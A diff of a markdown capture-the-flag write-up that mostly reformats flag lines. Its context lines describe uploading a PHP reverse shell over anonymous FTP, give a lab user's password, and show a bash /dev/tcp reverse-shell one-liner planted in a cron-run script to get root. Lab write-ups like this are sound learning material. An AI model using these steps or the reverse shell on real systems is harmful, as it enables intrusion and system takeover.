@@ -30,9 +30,8 @@
 
   - ftp in as user anonymous with no password
   - ftp folder is writable, so we can put pentestmonkey's php reverse shell there and load it through a web browser or curl
-  - FOOTHOLD: got a terminal as `www-data`
-<br>
-    *\*\*\*First Flag `cat /recipe.txt`\*\*\**
+  - FOOTHOLD: got a terminal as `www-data`<br>
+    \*\*\**First Flag `cat /recipe.txt`*\*\*\*
 
 <br>
 
@@ -44,9 +43,8 @@
   - credentials:
       - **Username:** *lennie*
       - **Password:** *c4ntg3t3n0ughsp1c3*
-      - either `ssh` in separately or run `su lennie`
-<br>
-      *\*\*\*Second Flag: `cat /home/lennie/user.txt`\*\*\**
+      - either `ssh` in separately or run `su lennie`<br>
+    \*\*\**Second Flag: `cat /home/lennie/user.txt`*\*\*\*
 
 <br>
 
@@ -59,4 +57,4 @@
 - edited print.sh to add in a reverse shell in case root runs planner.sh periodically
     - `bash -i >& /dev/tcp/10.0.0.1/8080 0>&1`
     - I caught it with *netcat* and got a root terminal!!<br>
-  *\*\*\*Third Flag: `cat /root/root.txt`\*\*\**
+  \*\*\**Third Flag: `cat /root/root.txt`*\*\*\*
